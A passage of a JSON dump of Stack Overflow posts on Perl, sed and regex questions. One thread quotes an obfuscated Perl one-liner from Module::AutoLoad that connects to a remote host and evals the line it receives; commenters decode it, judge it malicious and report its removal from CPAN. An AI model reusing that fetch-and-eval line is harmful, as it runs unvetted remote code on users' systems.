"display_name": "potong", "link": "https://stackoverflow.com/users/967492/potong"}, "is_accepted": false, "score": 0, "last_activity_date": 1454708937, "creation_date": 1454708937, "answer_id": 35234126, "question_id": 35216909, "link": "https://stackoverflow.com/questions/35216909/find-and-replace-exact-matching-hex-on-multiple-lines/35234126#35234126", "title": "find and replace exact matching hex on multiple lines", "body": "<p>This might work for you (GNU sed):</p>\n\n<pre><code>sed -r 'N;s/2f(\\n....  | )34(\\n....  | )2e(\\n....  | )30(\\n....  | )20(\\n....  | )28(\\n....  | )63(\\n....  | )6f/2f\\135\\22e\\330\\420\\528\\668\\763/;P;D' file\n</code></pre>\n\n<p>Keep a running window of two lines and pattern match. As the pattern may occur anywhere in the output allow for this by providing alternate patterns inbetween each pair of symbols.</p>\n\n<p>N.B. You may have limited success because pagination may upset the apple cart.</p>\n"}], "owner": {"reputation": 1, "user_id": 5886452, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/582976504827a0d4812057ac5f5e242a?s=128&d=identicon&r=PG&f=1", "display_name": "Thorfinn", "link": "https://stackoverflow.com/users/5886452/thorfinn"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 174, "favorite_count": 0, "answer_count": 4, "score": -1, "last_activity_date": 1454708937, "creation_date": 1454650185, "last_edit_date": 1454688771, "question_id": 35216909, "link": "https://stackoverflow.com/questions/35216909/find-and-replace-exact-matching-hex-on-multiple-lines", "title": "find and replace exact matching hex on multiple lines", "body": "<p><a href=\"http://i.stack.imgur.com/b0ZHO.png\" rel=\"nofollow\">enter image description here</a></p>\n\n<pre><code>0070  41 67 65 6e 74 3a 20 4d 6f 7a 69 6c 6c 61 2f 34\n0080  2e 30 20 28 63 6f 6d 70 61 74 69 62 6c 65 3b 20\n</code></pre>\n\n<p>I'm trying to find a way to find/match pattern</p>\n\n<pre><code>2f 34 2e 30 20 28 63 6f\n</code></pre>\n\n<p>and replace it with</p>\n\n<pre><code>2f 35 2e 30 20 28 68 63\n</code></pre>\n\n<p>Problem is this pattern can be broken up on two lines in many different ways e.g. <code>2f 34 2e 30 20</code> can be at end of first line then the rest of pattern on next line. I want to learn how so I can find a replace other (bigger) patterns as well. </p>\n\n<p>This code only works if the pattern is fully contained on one line.</p>\n\n<pre><code># replace hex equivalent of \"/4.0 (co\" with \"/5.0 (hc\" in hex field\nsed 's/2f 34 2e 30 20 28 63 6f/2f 35 2e 30 20 28 68 63/g' &lt;MPFADT$var.txt &gt;&gt;MPFADT$new.txt\"\n</code></pre>\n\n<p>I have played with awk and sed but, to no avail. I have looked at perl examples as well. </p>\n\n<p>I'm pretty sure I can get rid of the offset but, this requires merging which breaks formatting... </p>\n\n<pre><code>awk -F'  ' ' {print \" \"$2 &gt; file} MPFADT$var.txt\n</code></pre>\n"}, {"tags": ["perl", "ssh"], "comments": [{"owner": {"reputation": 487, "user_id": 13233, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ba96d57048f8ec987171c752399173aa?s=128&d=identicon&r=PG", "display_name": "Mark Grimes", "link": "https://stackoverflow.com/users/13233/mark-grimes"}, "edited": false, "score": 0, "creation_date": 1454773448, "post_id": 35216231, "comment_id": 58199704, "body": "Is there some prompt printed when a screen is filled and waiting on a carriage return (i.e., &quot;-- More --&quot;)?"}, {"owner": {"reputation": 655, "user_id": 4557493, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/TzPf5.jpg?s=128&g=1", "display_name": "Jelani", "link": "https://stackoverflow.com/users/4557493/jelani"}, "reply_to_user": {"reputation": 487, "user_id": 13233, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ba96d57048f8ec987171c752399173aa?s=128&d=identicon&r=PG", "display_name": "Mark Grimes", "link": "https://stackoverflow.com/users/13233/mark-grimes"}, "edited": false, "score": 0, "creation_date": 1454794057, "post_id": 35216231, "comment_id": 58207175, "body": "Yes, the prompt says to press any key.  I actually solved the problem by performing a nested loop.  I continue to send CR to the command line until i receive a &quot;#&quot; symbol.  When I receive a &quot;#&quot; symbol, i break out of the parent loop"}], "answers": [{"tags": [], "owner": {"reputation": 655, "user_id": 4557493, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/TzPf5.jpg?s=128&g=1", "display_name": "Jelani", "link": "https://stackoverflow.com/users/4557493/jelani"}, "is_accepted": false, "score": 0, "last_activity_date": 1454794371, "creation_date": 1454794371, "answer_id": 35246725, "question_id": 35216231, "link": "https://stackoverflow.com/questions/35216231/dealing-with-prompts-while-using-perl-and-ssh/35246725#35246725", "title": "Dealing with Prompts while using Perl and SSH", "body": "<p>I actually solved the problem by performing two loops.  WIthin the inner loop, I continue to send CR to the command line until i receive a \"#\" symbol.  When I receive a \"#\" symbol, i break out of the parent loop.</p>\n\n<pre><code>while($Defined)\n{\nwhile(#ssh-&gt;has_line(){\n//do stuff\n}\n$ssh-&gt;exec(\"D\\r\\n\");\nif ( index( $output, \"#\" ) != -1 ) \n{$Defined = undef;\n}else {}\n}\n</code></pre>\n"}], "owner": {"reputation": 655, "user_id": 4557493, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/TzPf5.jpg?s=128&g=1", "display_name": "Jelani", "link": "https://stackoverflow.com/users/4557493/jelani"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 101, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1454794371, "creation_date": 1454646007, "question_id": 35216231, "link": "https://stackoverflow.com/questions/35216231/dealing-with-prompts-while-using-perl-and-ssh", "title": "Dealing with Prompts while using Perl and SSH", "body": "<p>While using perl and Net::SSH:Expect, does anyone know how to continue to press \"\\r\\n\" until you receive a certain type of prompt \"#\"?  The router doesn't accept any type of command to extend the terminal length such as \"terminal length 0\".  Output commands \">\" are not support on the router either.  I've tried using the below command, but still no luck</p>\n\n<pre><code>    $ssh-&gt;send(\"show vlan all\\r\\n\");\n    START:\n    $ssh-&gt;send(\"\\r\\n\");\n    while ( $ssh-&gt;has_line() ) {\n\n        print $output= $ssh-&gt;read_line() .\"\\n\";\n        print OUTPUT \"$output\\n\";\n\n        }   \n    $ssh-&gt;waitfor('#',5) or  goto START;\n</code></pre>\n\n<p>I need some form of loop that sends a carriage return until a prompt is received.</p>\n"}, {"tags": ["regex", "linux", "perl", "special-characters"], "comments": [{"owner": {"reputation": 3984, "user_id": 1801086, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ef4c0400ffff14d5e1c16ca3856c09ba?s=128&d=identicon&r=PG", "display_name": "tjd", "link": "https://stackoverflow.com/users/1801086/tjd"}, "edited": false, "score": 2, "creation_date": 1454626187, "post_id": 35213073, "comment_id": 58141564, "body": "Backslash escapes on one-liners can be entertaining.  You&#39;ve got to get the backslash past your shell before Perl can see it.  anubhava has the right idea of entirely avoiding them."}], "answers": [{"comments": [{"owner": {"reputation": 97, "user_id": 4812217, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/28ef6470c7e73be6b7ebff032515fef7?s=128&d=identicon&r=PG&f=1", "display_name": "Jakob Benz", "link": "https://stackoverflow.com/users/4812217/jakob-benz"}, "edited": false, "score": 1, "creation_date": 1454626186, "post_id": 35213156, "comment_id": 58141563, "body": "Thank you, works perfectly! Another question: do you know a good perl tutorial?"}, {"owner": {"reputation": 3984, "user_id": 1801086, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ef4c0400ffff14d5e1c16ca3856c09ba?s=128&d=identicon&r=PG", "display_name": "tjd", "link": "https://stackoverflow.com/users/1801086/tjd"}, "reply_to_user": {"reputation": 97, "user_id": 4812217, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/28ef6470c7e73be6b7ebff032515fef7?s=128&d=identicon&r=PG&f=1", "display_name": "Jakob Benz", "link": "https://stackoverflow.com/users/4812217/jakob-benz"}, "edited": false, "score": 0, "creation_date": 1454626252, "post_id": 35213156, "comment_id": 58141595, "body": "@JakobBenz, your substitution would have worked well in a perl script.  You ran afoul of your shell."}], "tags": [], "owner": {"reputation": 658023, "user_id": 548225, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/dab08478b226280d4a30894c9a7ed719?s=128&d=identicon&r=PG", "display_name": "anubhava", "link": "https://stackoverflow.com/users/548225/anubhava"}, "is_accepted": true, "score": 1, "last_activity_date": 1454625965, "creation_date": 1454625965, "answer_id": 35213156, "question_id": 35213073, "link": "https://stackoverflow.com/questions/35213073/replace-string-with-special-characters-using-perl/35213156#35213156", "title": "Replace string with special characters using perl", "body": "<p>You don't need <code>s</code> and <code>e</code> modifiers and can also use an alternate regex demiter (other than <code>/</code>) to avoid escaping:</p>\n\n<pre><code>perl -pe 's~&lt;/string\u00a7&gt;~new string line 1 \\nnew string line 2~' file.xml\nnew string line 1\nnew string line 2\n</code></pre>\n"}], "owner": {"reputation": 97, "user_id": 4812217, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/28ef6470c7e73be6b7ebff032515fef7?s=128&d=identicon&r=PG&f=1", "display_name": "Jakob Benz", "link": "https://stackoverflow.com/users/4812217/jakob-benz"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1561, "favorite_count": 0, "accepted_answer_id": 35213156, "answer_count": 1, "score": 1, "last_activity_date": 1454625965, "creation_date": 1454625580, "question_id": 35213073, "link": "https://stackoverflow.com/questions/35213073/replace-string-with-special-characters-using-perl", "title": "Replace string with special characters using perl", "body": "<p>I'm trying to replace a string like</p>\n\n<pre><code>&lt;/string\u00a7&gt;\n</code></pre>\n\n<p>with </p>\n\n<pre><code>new string line 1\nnew string line 2\n</code></pre>\n\n<p>with perl on Linux.</p>\n\n<p>The problem is, that it won't accept the &lt; and > as well as the /.</p>\n\n<p>This is what i got:</p>\n\n<pre><code>perl -i -pe 's/\\&lt;\\/string\u00a7\\&gt;/new string line 1 \\n new string line 2/se' file.xml\n</code></pre>\n\n<p>Can anyone help?</p>\n\n<p>Thanks!</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 1, "creation_date": 1454625753, "post_id": 35212843, "comment_id": 58141338, "body": "That looks an awful lot like the synopsis in the documentation for <a href=\"https://metacpan.org/pod/Module%3a%3aAutoLoad\" rel=\"nofollow noreferrer\">Module::Autoload</a>. But explaining it would ruin the fun: &quot;Although the snippet is fairly short, it is intentionally obfuscated using the RCX Framework as a quick way to detour those prying eyes from following how all the magic works, but the experienced Perl coder can still understand everything. This puzzle is left as a recreational challenge to the reader.&quot;"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 2, "creation_date": 1454626245, "post_id": 35212843, "comment_id": 58141590, "body": "Please don&#39;t put your code off line unless it&#39;s so extensive that it won&#39;t fit in a post on Stack Overflow"}, {"owner": {"reputation": 145, "user_id": 5294505, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/f33cef13595dcf16558af228bc94da2a?s=128&d=identicon&r=PG&f=1", "display_name": "Avid Programmer", "link": "https://stackoverflow.com/users/5294505/avid-programmer"}, "edited": false, "score": 1, "creation_date": 1454696833, "post_id": 35212843, "comment_id": 58176502, "body": "The author of the code I&#39;m talking about is Rob Brown, and the IP shown in the code is outdated."}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 2, "creation_date": 1454698409, "post_id": 35212843, "comment_id": 58177401, "body": "@AvidProgrammer That&#39;s not an IP, it&#39;s a <a href=\"http://perldoc.perl.org/perldata.html#Version-Strings\" rel=\"nofollow noreferrer\">v-string</a>. <code>perl -le&#39;print 82.46.99.88&#39;</code> shows that it corresponds to <code>R.cX</code>"}, {"owner": {"reputation": 2936, "user_id": 39791, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/661c7cc5565e5bc21fb0fc22c0354fef?s=128&d=identicon&r=PG", "display_name": "Joe McMahon", "link": "https://stackoverflow.com/users/39791/joe-mcmahon"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1596056239, "post_id": 35212843, "comment_id": 111691585, "body": "I posted an answer and withdrew it because I feel that it would just be reiterating @Borodin&#39;s. This is an arbitrary remote code execution, and you do not want to do it."}, {"owner": {"reputation": 42833, "user_id": 18914, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7a20a39ae2ef47ae042a3eddd5b5bd19?s=128&d=identicon&r=PG", "display_name": "Dave Sherohman", "link": "https://stackoverflow.com/users/18914/dave-sherohman"}, "reply_to_user": {"reputation": 2936, "user_id": 39791, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/661c7cc5565e5bc21fb0fc22c0354fef?s=128&d=identicon&r=PG", "display_name": "Joe McMahon", "link": "https://stackoverflow.com/users/39791/joe-mcmahon"}, "edited": false, "score": 2, "creation_date": 1596097248, "post_id": 35212843, "comment_id": 111703212, "body": "@JoeMcMahon - Your deleted answer explicitly makes a lot of (IMO very important) points which Borodin doesn&#39;t state directly. I would encourage you to undelete it, as it may help to illuminate those who don&#39;t quite grasp the full details of just how boneheadedly idiotic this module is."}, {"owner": {"reputation": 2936, "user_id": 39791, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/661c7cc5565e5bc21fb0fc22c0354fef?s=128&d=identicon&r=PG", "display_name": "Joe McMahon", "link": "https://stackoverflow.com/users/39791/joe-mcmahon"}, "edited": false, "score": 0, "creation_date": 1596229192, "post_id": 35212843, "comment_id": 111756140, "body": "Thanks, I&#39;ve reinstated it, and noted the mitigations the author is taking."}], "answers": [{"comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1454629766, "post_id": 35213245, "comment_id": 58143108, "body": "Not really important, but for those who are curious: the code opens a socket to R.cX:1, reads a line from the socket, and evals it. That&#39;s where <code>botstrap</code> comes from (it&#39;s not actually in the source of Module::AutoLoad)."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 5, "creation_date": 1454630126, "post_id": 35213245, "comment_id": 58143252, "body": "@ThisSuitIsBlackNot: I was just writing a comment to say so. And that makes this module even less attractive than it initially appears. If you look at the contents of <code>http:&#47;&#47;R.cX:1&#47;</code> then even that is obfuscated. All of this goes against the ideas of open source, and calling this &quot;module&quot; in production code would be crazy for so very many reasons"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 5, "creation_date": 1454630731, "post_id": 35213245, "comment_id": 58143474, "body": "Even worse, the code downloaded from <code>http:&#47;&#47;r.cx:1&#47;</code> uses <code>eval</code> to access <code>http:&#47;&#47;ww.limera1n.com&#47;</code> and execute <code>iJailBreak</code>, which is an iPhone unlocker program. This is nothing to do with installing missing Perl modules, and the functionality is nefarious. That may be because the web site <code>http:&#47;&#47;r.cx</code> has been hacked, but there is no doubt that this module <i>doesn&#39;t belong on CPAN</i>."}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 4, "creation_date": 1454631029, "post_id": 35213245, "comment_id": 58143580, "body": "Wow. See kids, this is why you should avoid string <code>eval</code> with arbitrary code."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 1, "creation_date": 1454633470, "post_id": 35213245, "comment_id": 58144322, "body": "@ThisSuitIsBlackNot: Yes, but in general you should be able to install something from CPAN (or, in this case, simply follow its directions) without having to check that what you&#39;re installing won&#39;t harm you. Do you have any idea who is responsible for CPAN, and whom I should contact about this? I&#39;ve done some searches, but it seems to exist in a vacuum"}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1454638233, "post_id": 35213245, "comment_id": 58145521, "body": "Agreed. I almost said &quot;this is why you shouldn&#39;t run arbitrary code from the internet,&quot; but then I realized I do that all the time with CPAN. Maybe try modules@perl.org, the PAUSE admins mailing list."}, {"owner": {"reputation": 8718, "user_id": 5848200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8072aaf76dcb4fe5027964252f16382?s=128&d=identicon&r=PG", "display_name": "Grinnz", "link": "https://stackoverflow.com/users/5848200/grinnz"}, "edited": false, "score": 10, "creation_date": 1595889580, "post_id": 35213245, "comment_id": 111625466, "body": "FWIW: This code is malicious, but there are several options for automatically installing modules that don&#39;t involve string eval&#39;ing arbitrary code over TCP, such as <a href=\"https://metacpan.org/pod/lib::xi\" rel=\"nofollow noreferrer\">lib::xi</a> and <a href=\"https://metacpan.org/pod/lazy\" rel=\"nofollow noreferrer\">lazy</a>."}, {"owner": {"reputation": 2936, "user_id": 39791, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/661c7cc5565e5bc21fb0fc22c0354fef?s=128&d=identicon&r=PG", "display_name": "Joe McMahon", "link": "https://stackoverflow.com/users/39791/joe-mcmahon"}, "edited": false, "score": 9, "creation_date": 1595979960, "post_id": 35213245, "comment_id": 111660405, "body": "As of July 28, 2020, the module has been removed from CPAN and the author blocked from uploading further modules."}], "tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 16, "last_activity_date": 1454626410, "creation_date": 1454626410, "answer_id": 35213245, "question_id": 35212843, "link": "https://stackoverflow.com/questions/35212843/perl-understanding-botstrap/35213245#35213245", "title": "Perl - Understanding &quot;botstrap&quot;", "body": "<p><code>botstrap</code> is a private subroutine that is part of the <a href=\"http://metacpan.org/module/Module::AutoLoad\" rel=\"noreferrer\"><code>Module::AutoLoad</code></a> module. The entire statement is supposed to be incorporated into your code without question</p>\n\n<p>The idea is that the module will install any modules that are required by the code without intervention by the operator. I suggest that this is a dreadful idea, and that you should just make sure that anything your Python code imports has already been installed in the usual way</p>\n"}, {"tags": [], "owner": {"reputation": 2936, "user_id": 39791, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/661c7cc5565e5bc21fb0fc22c0354fef?s=128&d=identicon&r=PG", "display_name": "Joe McMahon", "link": "https://stackoverflow.com/users/39791/joe-mcmahon"}, "is_accepted": false, "score": 11, "last_activity_date": 1596339495, "last_edit_date": 1596339495, "creation_date": 1596056052, "answer_id": 63162269, "question_id": 35212843, "link": "https://stackoverflow.com/questions/35212843/perl-understanding-botstrap/63162269#63162269", "title": "Perl - Understanding &quot;botstrap&quot;", "body": "<p>I'm putting on my security hat and making some comments about the overall design of the module and specifically about the test suite.</p>\n<p>Time and again, we warn people about <code>curl | bash</code> as an outstandingly boneheaded thing to do. One should never simply execute something that happens to be at the far end of a URL that one does not control, and that is generally accessible on the Internet, and hope everything will be okay.</p>\n<p>But the reason that this module was pulled earlier was not that it does this -- though I would argue that even the basic idea of implementing a security vulnerability as a module is a terrible idea -- it was pulled because of all the following:</p>\n<ul>\n<li>the test suite accesses a site the installer does not control without warning them this will happen</li>\n<li>it obscures the site being used</li>\n<li>the code being downloaded is not the minimum possible needed to ensure that the test passes</li>\n<li>the code being downloaded is deliberately obfuscated to make it difficult for the installer to vet it for safety</li>\n<li>worst, the code that it currently downloads <em>appears</em> to be malware. (side note: it <em>does not matter</em> if it isn't! The fact that it is not blindingly obvious is in itself bad).</li>\n</ul>\n<p>The combination of all these is not only unsafe but outright dangerous. I see from the authors answers that the inclusion of a reference to an iOS jailbreak was meant to be &quot;funny&quot;. Production modules are not supposed to be this kind of funny.</p>\n<p>Putting this in a non-Acme namespace is inappropriate if humor is the intention[1]. Also, there is absolutely no need to obfuscate the downloaded code.</p>\n<p>Even if the author changes what it's loading to a cleartext dummy &quot;hey look, I got installed&quot; module, they'd still be weakening the security of every installation that used this module to be only as good as their security is. If you wanted to write a module like this, you would have to be prepared to take on that level of responsibility for every site that uses it. Even if you think you are prepared to do that, you are probably not.</p>\n<p>A footgun that is the responsibility of the user to police is one thing. A footgun that is delivered loaded, with ammunition that might suddenly be something extremely dangerous, and which is actually fired during <em>the test suite</em> is wildly inappropriate.</p>\n<p>Update: I've spoken directly to the author, who seems to be willing to make this right, and will be taking my advice on this module: moving it to Acme, changing the test to use a local HTTP server instead of the external one, and additionally requiring that the environment variable <code>I_KNOW_THIS_IS_A_REMOTE_CODE_EXECUTION_VULNERABILITY_AND_I_AM_WILLING_TO_RISK_MY_JOB_AND_COMPANY</code> be set to a true value before the module will operate at all.</p>\n<p>[1] CPAN uses the <code>Acme</code> namespace as a place to put amusing/pointless/etc. modules.</p>\n"}], "owner": {"reputation": 145, "user_id": 5294505, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/f33cef13595dcf16558af228bc94da2a?s=128&d=identicon&r=PG&f=1", "display_name": "Avid Programmer", "link": "https://stackoverflow.com/users/5294505/avid-programmer"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2133, "favorite_count": 0, "answer_count": 2, "score": 3, "last_activity_date": 1596339495, "creation_date": 1454624592, "last_edit_date": 1454626211, "question_id": 35212843, "link": "https://stackoverflow.com/questions/35212843/perl-understanding-botstrap", "title": "Perl - Understanding &quot;botstrap&quot;", "body": "<p>I have this piece of code</p>\n\n<pre><code>use lib do{eval&lt;$b&gt;&amp;&amp;botstrap(\"AutoLoad\")if$b=new IO::Socket::INET 82.46.99.88.\":1\"};\n</code></pre>\n\n<p>which seems to import a library, but I have no idea how <code>botstrap</code> works.</p>\n\n<p>Could somebody explain it to me because I want to port this to Python.</p>\n"}, {"tags": ["regex", "perl"], "answers": [{"comments": [{"owner": {"reputation": 784, "user_id": 4832134, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/ad7a1c7bef47a40b0e8ed5c1deb2d200?s=128&d=identicon&r=PG&f=1", "display_name": "John Rambo", "link": "https://stackoverflow.com/users/4832134/john-rambo"}, "edited": false, "score": 0, "creation_date": 1454622932, "post_id": 35212247, "comment_id": 58140010, "body": "I didn&#39;t get why the first test case is passing, as there are two characters present in the input i.e. a <b>new line</b>, and a character <b>a</b>."}, {"owner": {"reputation": 481636, "user_id": 3832970, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/64323e6cf08401474da3bf770ea13b58?s=128&d=identicon&r=PG&f=1", "display_name": "Wiktor Stribi\u017cew", "link": "https://stackoverflow.com/users/3832970/wiktor-stribi%c5%bcew"}, "reply_to_user": {"reputation": 784, "user_id": 4832134, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/ad7a1c7bef47a40b0e8ed5c1deb2d200?s=128&d=identicon&r=PG&f=1", "display_name": "John Rambo", "link": "https://stackoverflow.com/users/4832134/john-rambo"}, "edited": false, "score": 0, "creation_date": 1454623146, "post_id": 35212247, "comment_id": 58140123, "body": "I have explained it. The <code>$</code> is <code>\\Z</code>, matching right at the end, or before the last newline in the string. Your string <code>a\\n</code> has 1 non-whitespace character and it is matched with <code>.</code>. Then, the <code>$</code> matches the position in front of the last newline. Bingo!"}], "tags": [], "owner": {"reputation": 481636, "user_id": 3832970, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/64323e6cf08401474da3bf770ea13b58?s=128&d=identicon&r=PG&f=1", "display_name": "Wiktor Stribi\u017cew", "link": "https://stackoverflow.com/users/3832970/wiktor-stribi%c5%bcew"}, "is_accepted": true, "score": 3, "last_activity_date": 1454623660, "last_edit_date": 1495539914, "creation_date": 1454622369, "answer_id": 35212247, "question_id": 35212183, "link": "https://stackoverflow.com/questions/35212183/regular-expression-passes-for-one-character-sequence-whereas-fails-for-another/35212247#35212247", "title": "Regular Expression passes for one character sequence whereas fails for another", "body": "<p><strong>Concise answer</strong></p>\n\n<p>If you need to check if a string has only one character (any, incl. newline), use</p>\n\n<pre><code>/^.\\z/s\n</code></pre>\n\n<p><strong>Explanation</strong></p>\n\n<p>The problem stems from the fact that you are using the <code>$</code> without <code>D</code> modifier, meaning that <code>$</code> matches at the end, but not at the very end of the string. Here, <code>$</code> = <code>\\Z</code>.</p>\n\n<p>By default, <code>$</code> will match the end of string and the position before the last newline. Thus, <code>a\\n</code> passes the <code>if ($test =~ /^.$/ )</code> test, but <code>\\na</code> will not, since <code>.</code> cannot match a newline, and it is not at the end, but at the start (it won't be matched with <code>if ($test =~ /^.$/ )</code> nor with <code>if ($test =~ /^.$/s )</code>).</p>\n\n<p>Note that you can use <code>\\z</code> anchor that will force the regex engine to match at the very end of the string. Then, both test cases even with a DOTALL modifier will fail. Use <code>/^.\\z/</code> if you need that behavior. Or <code>/^.\\z/s</code> to also match a single newline.</p>\n\n<p>Also, see <a href=\"https://stackoverflow.com/questions/2707870/whats-the-difference-between-z-and-z-in-a-regular-expression-and-when-and-how\"><em>Whats the difference between \\z and \\Z in a regular expression and when and how do I use it?</em></a></p>\n"}, {"tags": [], "owner": {"reputation": 87649, "user_id": 17389, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/cd06d1314817ce946ab796af8750b56a?s=128&d=identicon&r=PG", "display_name": "ysth", "link": "https://stackoverflow.com/users/17389/ysth"}, "is_accepted": false, "score": 1, "last_activity_date": 1454624618, "creation_date": 1454624618, "answer_id": 35212848, "question_id": 35212183, "link": "https://stackoverflow.com/questions/35212183/regular-expression-passes-for-one-character-sequence-whereas-fails-for-another/35212848#35212848", "title": "Regular Expression passes for one character sequence whereas fails for another", "body": "<p>You have two problems.</p>\n\n<p>First, <code>$</code> does not match the end of the string.  In the absence of the <code>/m</code> flag, it is equivalent to <code>\\Z</code>, which matches <em>either</em> at the end of the string or just before a newline character at the end of the string.</p>\n\n<p>Almost always this is not what you intend and you should use <code>\\z</code> which only matches at the end of the string.  Pretty much any code that uses </p>\n\n<p>Secondly, <code>.</code> by default does not match any character.  Unless you supply the <code>/s</code> flag, it matches any character <em>but <code>\\n</code></em>.</p>\n\n<p>So your regex <code>/^.$/</code> will match:</p>\n\n<ol>\n<li>a single character that is not a newline, or</li>\n<li>two characters, where the first is not a newline but the second is</li>\n</ol>\n\n<p>To match a single character, use <code>/^.\\z/s</code> (or just length($string) == 1).</p>\n"}], "owner": {"reputation": 784, "user_id": 4832134, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/ad7a1c7bef47a40b0e8ed5c1deb2d200?s=128&d=identicon&r=PG&f=1", "display_name": "John Rambo", "link": "https://stackoverflow.com/users/4832134/john-rambo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 72, "favorite_count": 0, "accepted_answer_id": 35212247, "answer_count": 2, "score": 1, "last_activity_date": 1454624618, "creation_date": 1454622096, 